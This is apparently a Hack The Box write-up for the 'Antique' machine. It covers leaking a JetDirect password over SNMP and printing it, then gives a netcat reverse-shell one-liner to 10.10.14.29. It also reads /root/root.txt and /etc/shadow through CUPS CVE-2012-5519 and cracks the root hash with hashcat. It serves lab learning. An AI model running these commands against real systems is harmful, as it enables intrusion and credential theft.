---
date: 2025-04-11
categories: [CTF, HTB]
title: "HTB - Printer Exploitation Track - Antique"
tags: ['printer', 'pjl', 'pret', 'tryhackme', 'hackthebox', 'immersivelabs', 'thm', 'iml', 'htb']

description: "Printer Exploitation Track - - A walkthrough of the challenge with enumeration, exploitation and privilege escalation steps."
---

---
---

# HTB - Printer Exploitation Track - Antique


![image1](../resources/4ab4a45e16964c82b4a94cfe78f5a6f1.png)

![image2](../resources/b9c665893d0d4a9bb06cf3fb233ccfeb.png)

- I couldn't do anything on the telnet connection apart from grab the banner, because I don't know the password

- I came across this site:

`http://www.irongeek.com/i.php?page=security/networkprinterhacking`

- It says that JetAdmin uses SNMP and so I did a UDP scan for SNMP:

![image3](../resources/30fd5ec29f324520bdaea25360df9a44.png)

- And it is using SNMPv1 (according to NMAP)

- But if we use snmpwalk - **we see that v2 is being** used:

```bash
snmpwalk -v 1 -c public 10.129.62.107

```

![image4](../resources/a4d6824c97bd4b9087773c4f6234bb63.png)

```bash
snmpwalk -v 2c -c public 10.129.62.107

```

![image5](../resources/647155bc03b94d36bb4e58d07e2e88f8.png)

**<u>Leak the password</u>**
- According to this article, some JetDirect printers will leak the password (in Hex) if you send a SNMP GET request to a vulnerable printer:
<https://www.exploit-db.com/exploits/22319>

- Using snmpwalk we can add a **.1** to the end to **query ALL**:

```bash
snmpwalk -v 2c -c public 10.129.62.107 .1

```

![image6](../resources/c122c67f32b6493f9f263480d109caeb.png)

- We get the hex back, and can decode it with CyberChef:

![image7](../resources/27a375a3b7b2464dad66418b8e9641af.png)

- We get the password:
**P@ssw0rd@123!!123"#%&'01345789BCIPQTWXaetuy**

- And we are connected (no username - just the password):

![image8](../resources/4751b1eb659941c48b51cff2d3a6ac6d.png)

If the commands doesn't work - close the session and start a new session

- We can use the exec command to execute system commands:

![image9](../resources/13b7c88d840c4def86f0109797990c07.png)

- Set up a listener
- Execute a reverse shell:

```bash
exec rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.10.14.29 4444 >/tmp/f

```

![image10](../resources/5b6a9bea2aa8404592bba8dc7852282a.png)


![image11](../resources/a4e9fbecb932482f85d13a46a4e02cf4.png)

- Looking at open ports - we find 631 (Internet Printing Protocol (IPP)) is open:

![image12](../resources/bd07877c03134169bdb907a8383f3c06.png)

<https://book.hacktricks.xyz/network-services-pentesting/pentesting-631-internet-printing-protocol-ipp>

- We can curl to find out more:

```bash
curl http://127.0.0.1:631

```

![image13](../resources/41ecee78d86049a6874e88c32ed27860.png)

- Cups version:

![image14](../resources/24a06f42a552400185eb3e0d405a5d26.png)

- Looking online, we find an exploit for this version CVE-2012â€“5519:


![image15](../resources/3b9f012adaed4dc89c73740a3768674a.png)

- There is a metasploit module for it:
<https://www.infosecmatter.com/metasploit-module-library/?mm=post/multi/escalate/cups_root_file_read>

- But we don't need to use it. We can extract the info from it and just use that:

Read file as root:

- First we need to set the env variable for **ErrorLog** to the file we want to read:

```bash
cupsctl ErrorLog=/root/root.txt

```

![image16](../resources/cfbfb4288bf148afb68839042f40cddc.png)

- Then we need to send a GET request to **/admin/log/error_log?** :

![image17](../resources/f9741cbc1bad4474b430b7304a10a81d.png)

- We can go further and read /etc/shadow and get the root hash:

![image18](../resources/93b1d83fd93443a5b58a3126e80cbe50.png)

- Find the encryption method with:

```bash
grep ENCRYPT_METHOD /etc/login.defs

```

![image19](../resources/480fd9b6907a4ba88990102cae3e5eb3.png)

- I don't know if hashcat will find it but it was taking ages:

```bash
hashcat -m 1800 -a 0 hash.txt /usr/share/wordlists/rockyou.txt

```